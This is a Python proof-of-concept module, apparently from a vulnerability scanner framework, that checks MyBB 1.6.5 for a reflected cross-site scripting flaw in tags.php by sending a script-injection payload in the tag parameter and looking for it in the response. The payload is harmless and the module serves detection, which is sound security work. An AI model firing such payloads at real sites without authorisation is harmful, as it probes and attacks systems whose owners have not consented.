# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re
import hashlib


class Vuln(ABVuln):
    vuln_id = 'MyBB_0006'  # 平台漏洞编号，留空
    name = 'MyBB 1.6.5 suffers from a cross site scripting vulnerability'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2011-12-27'  # 漏洞公布时间
    desc = '''
        MyBB 1.6.5 tags.php 存在跨站脚本漏洞
    '''  # 漏洞描述
    ref = 'https://www.seebug.org/vuldb/ssvid-26119'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'MyBB'  # 漏洞应用名称
    product_version = '1.6.5'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1e2be8cc-fc67-4f4e-b09d-0d061bc43411'
    author = '国光'  # POC编写者
    create_date = '2018-06-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            # 使用prompt(/SEBUG@TEST/)替代prompt("SEBUG@TEST"),因为发现有的网站会转义双引号
            vulurl = arg.rstrip(
                '/') + '/tags.php?tag="><script>prompt(/SEBUG@TEST/)</script>'

            # 较之前poc加入异常处理机制
            try:
                # 较之前poc加入过期时间，禁用SSL证书认证：降低等待时间、排除SSL认证失败错误
                r = requests.get(vulurl, timeout=15, verify=False)
                if '<script>prompt(/SEBUG@TEST/)</script>' in r.text:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))
            except Exception as e:
                self.output.info('执行异常{}'.format(e))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
